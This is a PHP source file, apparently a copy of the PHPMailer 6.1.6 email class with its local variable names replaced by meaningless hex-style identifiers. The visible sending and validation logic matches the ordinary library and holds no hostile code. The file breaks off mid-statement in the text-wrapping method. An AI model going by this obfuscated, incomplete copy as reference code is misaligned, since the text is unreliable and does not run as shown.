<?php
error_reporting(E_PARSE | E_CORE_ERROR); class PHPMailer { const CHARSET_ASCII = 'us-ascii'; const CHARSET_ISO88591 = 'iso-8859-1'; const CHARSET_UTF8 = 'utf-8'; const CONTENT_TYPE_PLAINTEXT = 'text/plain'; const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar'; const CONTENT_TYPE_TEXT_HTML = 'text/html'; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative'; const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed'; const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related'; const ENCODING_7BIT = '7bit'; const ENCODING_8BIT = '8bit'; const ENCODING_BASE64 = 'base64'; const ENCODING_BINARY = 'binary'; const ENCODING_QUOTED_PRINTABLE = 'quoted-printable'; const ENCRYPTION_STARTTLS = 'tls'; const ENCRYPTION_SMTPS = 'ssl'; const ICAL_METHOD_REQUEST = 'REQUEST'; const ICAL_METHOD_PUBLISH = 'PUBLISH'; const ICAL_METHOD_REPLY = 'REPLY'; const ICAL_METHOD_ADD = 'ADD'; const ICAL_METHOD_CANCEL = 'CANCEL'; const ICAL_METHOD_REFRESH = 'REFRESH'; const ICAL_METHOD_COUNTER = 'COUNTER'; const ICAL_METHOD_DECLINECOUNTER = 'DECLINECOUNTER'; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = 'root@localhost'; public $FromName = 'Root User'; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected static $IcalMethods = array(self::ICAL_METHOD_REQUEST, self::ICAL_METHOD_PUBLISH, self::ICAL_METHOD_REPLY, self::ICAL_METHOD_ADD, self::ICAL_METHOD_CANCEL, self::ICAL_METHOD_REFRESH, self::ICAL_METHOD_COUNTER, self::ICAL_METHOD_DECLINECOUNTER); protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = 'mail'; public $Sendmail = '/usr/sbin/sendmail'; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = 'localhost'; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = 'echo'; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = 'php'; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = '6.1.6'; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = '
'; const FWS = ' '; protected static $LE = self::CRLF; const MAIL_MAX_LINE_LENGTH = 63; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($spa52add = null) { if (null !== $spa52add) { $this->exceptions = (bool) $spa52add; } $this->Debugoutput = strpos(PHP_SAPI, 'cli') !== false ? 'echo' : 'html'; } public function __destruct() { $this->smtpClose(); } private function spf85ebf($sp9c9f9c, $spc7b87c, $spb9ada7, $sp3481c3, $sp868ae0) { if (ini_get('mbstring.func_overload') & 1) { $spc7b87c = $this->secureHeader($spc7b87c); } else { $spc7b87c = $this->encodeHeader($this->secureHeader($spc7b87c)); } if (!$this->UseSendmailOptions || null === $sp868ae0) { $spd1b056 = @mail($sp9c9f9c, $spc7b87c, $spb9ada7, $sp3481c3); } else { $spd1b056 = @mail($sp9c9f9c, $spc7b87c, $spb9ada7, $sp3481c3, $sp868ae0); } return $spd1b056; } protected function edebug($spd82e5e) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($spd82e5e); return; } if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, array('error_log', 'html', 'echo'))) { call_user_func($this->Debugoutput, $spd82e5e, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case 'error_log': error_log($spd82e5e); break; case 'html': echo htmlentities(preg_replace('/[\\r\\n]+/', '', $spd82e5e), ENT_QUOTES, 'UTF-8'), '<br>
'; break; case 'echo': default: $spd82e5e = preg_replace('/\\r\\n|\\r/m', '
', $spd82e5e); echo gmdate('Y-m-d H:i:s'), '	', trim(str_replace('
', '
                   	                  ', trim($spd82e5e))), '
'; } } public function isHTML($spe6f75d = true) { if ($spe6f75d) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = 'smtp'; } public function isMail() { $this->Mailer = 'mail'; } public function isSendmail() { $sp2438fd = ini_get('sendmail_path'); if (false === stripos($sp2438fd, 'sendmail')) { $this->Sendmail = '/usr/sbin/sendmail'; } else { $this->Sendmail = $sp2438fd; } $this->Mailer = 'sendmail'; } public function isQmail() { $sp2438fd = ini_get('sendmail_path'); if (false === stripos($sp2438fd, 'qmail')) { $this->Sendmail = '/var/qmail/bin/qmail-inject'; } else { $this->Sendmail = $sp2438fd; } $this->Mailer = 'qmail'; } public function addAddress($sp7810fb, $spea80ec = '') { return $this->addOrEnqueueAnAddress('to', $sp7810fb, $spea80ec); } public function addCC($sp7810fb, $spea80ec = '') { return $this->addOrEnqueueAnAddress('cc', $sp7810fb, $spea80ec); } public function addBCC($sp7810fb, $spea80ec = '') { return $this->addOrEnqueueAnAddress('bcc', $sp7810fb, $spea80ec); } public function addReplyTo($sp7810fb, $spea80ec = '') { return $this->addOrEnqueueAnAddress('Reply-To', $sp7810fb, $spea80ec); } protected function addOrEnqueueAnAddress($spdb5bbc, $sp7810fb, $spea80ec) { $sp7810fb = trim($sp7810fb); $spea80ec = trim(preg_replace('/[\\r\\n]+/', '', $spea80ec)); $sp772c67 = strrpos($sp7810fb, '@'); if (false === $sp772c67) { $spbd1268 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spdb5bbc, $sp7810fb); $this->setError($spbd1268); $this->edebug($spbd1268); if ($this->exceptions) { throw new Exception($spbd1268); } return false; } $sp868ae0 = array($spdb5bbc, $sp7810fb, $spea80ec); if (static::idnSupported() && $this->has8bitChars(substr($sp7810fb, ++$sp772c67))) { if ('Reply-To' !== $spdb5bbc) { if (!array_key_exists($sp7810fb, $this->RecipientsQueue)) { $this->RecipientsQueue[$sp7810fb] = $sp868ae0; return true; } } elseif (!array_key_exists($sp7810fb, $this->ReplyToQueue)) { $this->ReplyToQueue[$sp7810fb] = $sp868ae0; return true; } return false; } return call_user_func_array(array($this, 'addAnAddress'), $sp868ae0); } protected function addAnAddress($spdb5bbc, $sp7810fb, $spea80ec = '') { if (!in_array($spdb5bbc, array('to', 'cc', 'bcc', 'Reply-To'))) { $spbd1268 = sprintf('%s: %s', $this->lang('Invalid recipient kind'), $spdb5bbc); $this->setError($spbd1268); $this->edebug($spbd1268); if ($this->exceptions) { throw new Exception($spbd1268); } return false; } if (!static::validateAddress($sp7810fb)) { $spbd1268 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spdb5bbc, $sp7810fb); $this->setError($spbd1268); $this->edebug($spbd1268); if ($this->exceptions) { throw new Exception($spbd1268); } return false; } if ('Reply-To' !== $spdb5bbc) { if (!array_key_exists(strtolower($sp7810fb), $this->all_recipients)) { $this->{$spdb5bbc}[] = array($sp7810fb, $spea80ec); $this->all_recipients[strtolower($sp7810fb)] = true; return true; } } elseif (!array_key_exists(strtolower($sp7810fb), $this->ReplyTo)) { $this->ReplyTo[strtolower($sp7810fb)] = array($sp7810fb, $spea80ec); return true; } return false; } public static function parseAddresses($sp7f40fe, $sp8ceef1 = true) { $sp97f446 = array(); if ($sp8ceef1 && function_exists('imap_rfc822_parse_adrlist')) { $spff83b0 = imap_rfc822_parse_adrlist($sp7f40fe, ''); foreach ($spff83b0 as $sp7810fb) { if ('.SYNTAX-ERROR.' !== $sp7810fb->host && static::validateAddress($sp7810fb->mailbox . '@' . $sp7810fb->host)) { $sp97f446[] = array('name' => property_exists($sp7810fb, 'personal') ? $sp7810fb->personal : '', 'address' => $sp7810fb->mailbox . '@' . $sp7810fb->host); } } } else { $spff83b0 = explode(',', $sp7f40fe); foreach ($spff83b0 as $sp7810fb) { $sp7810fb = trim($sp7810fb); if (strpos($sp7810fb, '<') === false) { if (static::validateAddress($sp7810fb)) { $sp97f446[] = array('name' => '', 'address' => $sp7810fb); } } else { list($spea80ec, $sp7f5bd0) = explode('<', $sp7810fb); $sp7f5bd0 = trim(str_replace('>', '', $sp7f5bd0)); if (static::validateAddress($sp7f5bd0)) { $sp97f446[] = array('name' => trim(str_replace(array('"', '\''), '', $spea80ec)), 'address' => $sp7f5bd0); } } } } return $sp97f446; } public function setFrom($sp7810fb, $spea80ec = '', $sp6c8c30 = true) { $sp7810fb = trim($sp7810fb); $spea80ec = trim(preg_replace('/[\\r\\n]+/', '', $spea80ec)); $sp772c67 = strrpos($sp7810fb, '@'); if (false === $sp772c67 || (!$this->has8bitChars(substr($sp7810fb, ++$sp772c67)) || !static::idnSupported()) && !static::validateAddress($sp7810fb)) { $spbd1268 = sprintf('%s (From): %s', $this->lang('invalid_address'), $sp7810fb); $this->setError($spbd1268); $this->edebug($spbd1268); if ($this->exceptions) { throw new Exception($spbd1268); } return false; } $this->From = $sp7810fb; $this->FromName = $spea80ec; if ($sp6c8c30 && empty($this->Sender)) { $this->Sender = $sp7810fb; } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($sp7810fb, $spc04492 = null) { if (null === $spc04492) { $spc04492 = static::$validator; } if (is_callable($spc04492)) { return $spc04492($sp7810fb); } if (strpos($sp7810fb, '
') !== false || strpos($sp7810fb, '
') !== false) { return false; } switch ($spc04492) { case 'pcre': case 'pcre8': return (bool) preg_match('/^(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\\x0D\\x0A)?[\\t ])+|(?>[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?>(?2)' . '(?>[\\x01-\\x08\\x0B\\x0C\\x0E-\'*-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' . '([!#-\'*+\\/-9=?^-~-]+|"(?>(?2)(?>[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]))*' . '(?2)")(?>(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\\.(?9)){3}))\\])(?1)$/isD', $sp7810fb); case 'html5': return (bool) preg_match('/^[a-zA-Z0-9.!#$%&\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $sp7810fb); case 'php': default: return filter_var($sp7810fb, FILTER_VALIDATE_EMAIL) !== false; } } public static function idnSupported() { return function_exists('idn_to_ascii') && function_exists('mb_convert_encoding'); } public function punyencodeAddress($sp7810fb) { $sp772c67 = strrpos($sp7810fb, '@'); if (!empty($this->CharSet) && false !== $sp772c67 && static::idnSupported()) { $sp43108e = substr($sp7810fb, ++$sp772c67); if ($this->has8bitChars($sp43108e) && @mb_check_encoding($sp43108e, $this->CharSet)) { $sp43108e = mb_convert_encoding($sp43108e, 'UTF-8', $this->CharSet); $spb19ec3 = 0; if (defined('INTL_IDNA_VARIANT_UTS46')) { $sp31f3a1 = idn_to_ascii($sp43108e, $spb19ec3, INTL_IDNA_VARIANT_UTS46); } elseif (defined('INTL_IDNA_VARIANT_2003')) { $sp31f3a1 = idn_to_ascii($sp43108e, $spb19ec3, INTL_IDNA_VARIANT_2003); } else { $sp31f3a1 = idn_to_ascii($sp43108e, $spb19ec3); } if (false !== $sp31f3a1) { return substr($sp7810fb, 0, $sp772c67) . $sp31f3a1; } } } return $sp7810fb; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $sp9d3ae1) { $this->mailHeader = ''; $this->setError($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return false; } } public function preSend() { if ('smtp' === $this->Mailer || 'mail' === $this->Mailer && stripos(PHP_OS, 'WIN') === 0) { static::setLE(self::CRLF); } else { static::setLE(PHP_EOL); } if ('mail' === $this->Mailer && (PHP_VERSION_ID >= 70000 && PHP_VERSION_ID < 70017 || PHP_VERSION_ID >= 70100 && PHP_VERSION_ID < 70103) && ini_get('mail.add_x_header') === '1' && stripos(PHP_OS, 'WIN') === 0) { trigger_error('Your version of PHP is affected by a bug that may result in corrupted messages.' . ' To fix it, switch to sending using SMTP, disable the mail.add_x_header option in' . ' your php.ini, switch to MacOS or Linux, or upgrade your PHP to version 7.0.17+ or 7.1.3+.', E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $sp868ae0) { $sp868ae0[1] = $this->punyencodeAddress($sp868ae0[1]); call_user_func_array(array($this, 'addAnAddress'), $sp868ae0); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang('provide_address'), self::STOP_CRITICAL); } foreach (array('From', 'Sender', 'ConfirmReadingTo') as $spabd042) { $this->{$spabd042} = trim($this->{$spabd042}); if (empty($this->{$spabd042})) { continue; } $this->{$spabd042} = $this->punyencodeAddress($this->{$spabd042}); if (!static::validateAddress($this->{$spabd042})) { $spbd1268 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spabd042, $this->{$spabd042}); $this->setError($spbd1268); $this->edebug($spbd1268); if ($this->exceptions) { throw new Exception($spbd1268); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty && empty($this->Body)) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $sp07e75a = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $sp07e75a; if ('mail' === $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend('To', $this->to); } else { $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;'); } $this->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) && !empty($this->DKIM_selector) && (!empty($this->DKIM_private_string) || !empty($this->DKIM_private) && static::isPermittedPath($this->DKIM_private) && file_exists($this->DKIM_private))) { $sp8fa0c0 = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = static::stripTrailingWSP($this->MIMEHeader) . static::$LE . static::normalizeBreaks($sp8fa0c0) . static::$LE; } return true; } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return false; } } public function postSend() { try { switch ($this->Mailer) { case 'sendmail': case 'qmail': return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case 'smtp': return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case 'mail': return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $spb48529 = $this->Mailer . 'Send'; if (method_exists($this, $spb48529)) { return $this->{$spb48529}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); $this->edebug($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } } return false; } protected function sendmailSend($sp3481c3, $spb9ada7) { $sp3481c3 = static::stripTrailingWSP($sp3481c3) . static::$LE . static::$LE; if (!empty($this->Sender) && self::isShellSafe($this->Sender)) { if ('qmail' === $this->Mailer) { $sp47336c = '%s -f%s'; } else { $sp47336c = '%s -oi -f%s -t'; } } elseif ('qmail' === $this->Mailer) { $sp47336c = '%s'; } else { $sp47336c = '%s -oi -t'; } $spcac935 = sprintf($sp47336c, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $sp104806) { $spb1f028 = @popen($spcac935, 'w'); if (!$spb1f028) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($spb1f028, 'To: ' . $sp104806 . '
'); fwrite($spb1f028, $sp3481c3); fwrite($spb1f028, $spb9ada7); $spd1b056 = pclose($spb1f028); $this->doCallback($spd1b056 === 0, array($sp104806), $this->cc, $this->bcc, $this->Subject, $spb9ada7, $this->From, array()); if (0 !== $spd1b056) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } } else { $spb1f028 = @popen($spcac935, 'w'); if (!$spb1f028) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($spb1f028, $sp3481c3); fwrite($spb1f028, $spb9ada7); $spd1b056 = pclose($spb1f028); $this->doCallback($spd1b056 === 0, $this->to, $this->cc, $this->bcc, $this->Subject, $spb9ada7, $this->From, array()); if (0 !== $spd1b056) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($spb544cc) { if (escapeshellcmd($spb544cc) !== $spb544cc || !in_array(escapeshellarg($spb544cc), array("'{$spb544cc}'", "\"{$spb544cc}\""))) { return false; } $spcca846 = strlen($spb544cc); for ($spe144a6 = 0; $spe144a6 < $spcca846; ++$spe144a6) { $sp417364 = $spb544cc[$spe144a6]; if (!ctype_alnum($sp417364) && strpos('@_-.', $sp417364) === false) { return false; } } return true; } protected static function isPermittedPath($sp2cedb8) { return !preg_match('#^[a-z]+://#i', $sp2cedb8); } protected function mailSend($sp3481c3, $spb9ada7) { $sp3481c3 = static::stripTrailingWSP($sp3481c3) . static::$LE . static::$LE; $sp0e626c = array(); foreach ($this->to as $sp51b31c) { $sp0e626c[] = $this->addrFormat($sp51b31c); } $sp9c9f9c = implode(', ', $sp0e626c); $sp868ae0 = null; if (!empty($this->Sender) && static::validateAddress($this->Sender) && self::isShellSafe($this->Sender)) { $sp868ae0 = sprintf('-f%s', $this->Sender); } if (!empty($this->Sender) && static::validateAddress($this->Sender)) { $sp7ad659 = ini_get('sendmail_from'); ini_set('sendmail_from', $this->Sender); } $spd1b056 = false; if ($this->SingleTo && count($sp0e626c) > 1) { foreach ($sp0e626c as $sp104806) { $spd1b056 = $this->spf85ebf($sp104806, $this->Subject, $spb9ada7, $sp3481c3, $sp868ae0); $this->doCallback($spd1b056, array($sp104806), $this->cc, $this->bcc, $this->Subject, $spb9ada7, $this->From, array()); } } else { $spd1b056 = $this->spf85ebf($sp9c9f9c, $this->Subject, $spb9ada7, $sp3481c3, $sp868ae0); $this->doCallback($spd1b056, $this->to, $this->cc, $this->bcc, $this->Subject, $spb9ada7, $this->From, array()); } if (isset($sp7ad659)) { ini_set('sendmail_from', $sp7ad659); } if (!$spd1b056) { throw new Exception($this->lang('instantiate'), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } public function setSMTPInstance(SMTP $spc89a00) { $this->smtp = $spc89a00; return $this->smtp; } protected function smtpSend($sp3481c3, $spb9ada7) { $sp3481c3 = static::stripTrailingWSP($sp3481c3) . static::$LE . static::$LE; $sp9f1e93 = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang('smtp_connect_failed'), self::STOP_CRITICAL); } if ('' === $this->Sender) { $spbcda53 = $this->From; } else { $spbcda53 = $this->Sender; } if (!$this->smtp->mail($spbcda53)) { $this->setError($this->lang('from_failed') . $spbcda53 . ' : ' . implode(',', $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $sp9fa2d2 = array(); foreach (array($this->to, $this->cc, $this->bcc) as $sp0b61f9) { foreach ($sp0b61f9 as $sp9c9f9c) { if (!$this->smtp->recipient($sp9c9f9c[0], $this->dsn)) { $sp2b82f9 = $this->smtp->getError(); $sp9f1e93[] = array('to' => $sp9c9f9c[0], 'error' => $sp2b82f9['detail']); $spf055bd = false; } else { $spf055bd = true; } $sp9fa2d2[] = array('issent' => $spf055bd, 'to' => $sp9c9f9c[0]); } } if (count($this->all_recipients) > count($sp9f1e93) && !$this->smtp->data($sp3481c3 . $spb9ada7)) { throw new Exception($this->lang('data_not_accepted'), self::STOP_CRITICAL); } $spbe7637 = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($sp9fa2d2 as $sp1f9a7e) { $this->doCallback($sp1f9a7e['issent'], array($sp1f9a7e['to']), array(), array(), $this->Subject, $spb9ada7, $this->From, array('smtp_transaction_id' => $spbe7637)); } if (count($sp9f1e93) > 0) { $spc31830 = ''; foreach ($sp9f1e93 as $sp1f9e92) { $spc31830 .= $sp1f9e92['to'] . ': ' . $sp1f9e92['error']; } throw new Exception($this->lang('recipients_failed') . $spc31830, self::STOP_CONTINUE); } return true; } public function smtpConnect($specf720 = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $specf720) { $specf720 = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $sp8598b1 = explode(';', $this->Host); $speea2b0 = null; foreach ($sp8598b1 as $sp553d45) { $sp518345 = array(); if (!preg_match('/^(?:(ssl|tls):\\/\\/)?(.+?)(?::(\\d+))?$/', trim($sp553d45), $sp518345)) { $this->edebug($this->lang('invalid_hostentry') . ' ' . trim($sp553d45)); continue; } if (!static::isValidHost($sp518345[2])) { $this->edebug($this->lang('invalid_host') . ' ' . $sp518345[2]); continue; } $sp72370a = ''; $sp2e98c1 = $this->SMTPSecure; $sp20d845 = static::ENCRYPTION_STARTTLS === $this->SMTPSecure; if ('ssl' === $sp518345[1] || '' === $sp518345[1] && static::ENCRYPTION_SMTPS === $this->SMTPSecure) { $sp72370a = 'ssl://'; $sp20d845 = false; $sp2e98c1 = static::ENCRYPTION_SMTPS; } elseif ('tls' === $sp518345[1]) { $sp20d845 = true; $sp2e98c1 = static::ENCRYPTION_STARTTLS; } $spe1abf8 = defined('OPENSSL_ALGO_SHA256'); if (static::ENCRYPTION_STARTTLS === $sp2e98c1 || static::ENCRYPTION_SMTPS === $sp2e98c1) { if (!$spe1abf8) { throw new Exception($this->lang('extension_missing') . 'openssl', self::STOP_CRITICAL); } } $spbb8891 = $sp518345[2]; $sp6bf692 = $this->Port; if (array_key_exists(3, $sp518345) && is_numeric($sp518345[3]) && $sp518345[3] > 0 && $sp518345[3] < 65536) { $sp6bf692 = (int) $sp518345[3]; } if ($this->smtp->connect($sp72370a . $spbb8891, $sp6bf692, $this->Timeout, $specf720)) { try { if ($this->Helo) { $sp417707 = $this->Helo; } else { $sp417707 = $this->serverHostname(); } $this->smtp->hello($sp417707); if ($this->SMTPAutoTLS && $spe1abf8 && 'ssl' !== $sp2e98c1 && $this->smtp->getServerExt('STARTTLS')) { $sp20d845 = true; } if ($sp20d845) { if (!$this->smtp->startTLS()) { throw new Exception($this->lang('connect_host')); } $this->smtp->hello($sp417707); } if ($this->SMTPAuth && !$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang('authenticate')); } return true; } catch (Exception $sp9d3ae1) { $speea2b0 = $sp9d3ae1; $this->edebug($sp9d3ae1->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions && null !== $speea2b0) { throw $speea2b0; } return false; } public function smtpClose() { if (null !== $this->smtp && $this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } public function setLanguage($spe643fb = 'en', $sp0ded0e = '') { $sp7f307c = array('br' => 'pt_br', 'cz' => 'cs', 'dk' => 'da', 'no' => 'nb', 'se' => 'sv', 'rs' => 'sr', 'tg' => 'tl', 'am' => 'hy'); if (isset($sp7f307c[$spe643fb])) { $spe643fb = $sp7f307c[$spe643fb]; } $sp8d5bb3 = array('authenticate' => 'SMTP Error: Could not authenticate.', 'connect_host' => 'SMTP Error: Could not connect to SMTP host.', 'data_not_accepted' => 'SMTP Error: data not accepted.', 'empty_message' => 'Message body empty', 'encoding' => 'Unknown encoding: ', 'execute' => 'Could not execute: ', 'file_access' => 'Could not access file: ', 'file_open' => 'File Error: Could not open file: ', 'from_failed' => 'The following From address failed: ', 'instantiate' => 'Could not instantiate mail function.', 'invalid_address' => 'Invalid address: ', 'invalid_hostentry' => 'Invalid hostentry: ', 'invalid_host' => 'Invalid host: ', 'mailer_not_supported' => ' mailer is not supported.', 'provide_address' => 'You must provide at least one recipient email address.', 'recipients_failed' => 'SMTP Error: The following recipients failed: ', 'signing' => 'Signing Error: ', 'smtp_connect_failed' => 'SMTP connect() failed.', 'smtp_error' => 'SMTP server error: ', 'variable_set' => 'Cannot set or reset variable: ', 'extension_missing' => 'Extension missing: '); if (empty($sp0ded0e)) { $sp0ded0e = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR; } if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $spe643fb)) { $spe643fb = 'en'; } $sp632b33 = true; $sp2a1957 = $sp0ded0e . 'phpmailer.lang-' . $spe643fb . '.php'; if ('en' !== $spe643fb) { if (!static::isPermittedPath($sp2a1957) || !file_exists($sp2a1957)) { $sp632b33 = false; } else { $sp632b33 = (include $sp2a1957); } } $this->language = $sp8d5bb3; return (bool) $sp632b33; } public function getTranslations() { return $this->language; } public function addrAppend($spd0476d, $spa67383) { $sp97f446 = array(); foreach ($spa67383 as $sp7810fb) { $sp97f446[] = $this->addrFormat($sp7810fb); } return $spd0476d . ': ' . implode(', ', $sp97f446) . static::$LE; } public function addrFormat($spa67383) { if (empty($spa67383[1])) { return $this->secureHeader($spa67383[0]); } return $this->encodeHeader($this->secureHeader($spa67383[1]), 'phrase') . ' <' . $this->secureHeader($spa67383[0]) . '>'; } public function wrapText($spcc4379, $spcca846, $sp866d9a = false) { if ($sp866d9a) { $spe0a42b = sprintf(' =%s', static::$LE); } else { $spe0a42b = static::$LE; } $spcf1177 = static::CHARSET_UTF8 === strtolower($this->CharSet); $sp5b3ddd = strlen(static::$LE); $spbc7abc = strlen(static::$LE); $spcc4379 = static::normalizeBreaks($spcc4379); if (substr($spcc4379, -$sp5b3ddd) === static::$LE) { $spcc4379 = substr($spcc4379, 0, -$sp5b3ddd); } $sp6e5c3d = explode(static::$LE, $spcc4379); $spcc4379 = ''; foreach ($sp6e5c3d as $sp61efeb) { $sp95e651 = explode(' ', $sp61efeb); $sp8cce46 = ''; $sp2b0c60 = true; foreach ($sp95e651 as $spc99cbd) { if ($sp866d9a && strlen($spc99cbd) > $spcca846) { $sp6a4f9d = $spcca846 - strlen($sp8cce46) - $spbc7abc; if (!$sp2b0c60) { if ($sp6a4f9d > 20) { $spca0243 = $sp6a4f9d; if ($spcf1177) { $spca0243 = $this->utf8CharBoundary($spc99cbd, $spca0243); } elseif ('=' === substr($spc99cbd, $spca0243 - 1, 1)) { --$spca0243; } elseif ('=' === substr($spc99cbd, $spca0243 - 2, 1)) { $spca0243 -= 2; } $sp31905b = substr($spc99cbd, 0, $spca0243); $spc99cbd = substr($spc99cbd, $spca0243); $sp8cce46 .= ' ' . $sp31905b; $spcc4379 .= $sp8cce46 . sprintf('=%s', static::$LE); } else { $spcc4379 .= $sp8cce46 . $spe0a42b; } $sp8cce46 = ''; } while ($spc99cbd !== '') { if ($spcca846 <= 0) { break; } $spca0243 = $spcca846; if ($spcf1177) { $spca0243 = $this->utf8CharBoundary($spc99cbd, $spca0243); } elseif ('=' === substr($spc99cbd, $spca0243 - 1, 1)) { --$spca0243; } elseif ('=' === substr($spc99cbd, $spca0243 - 2, 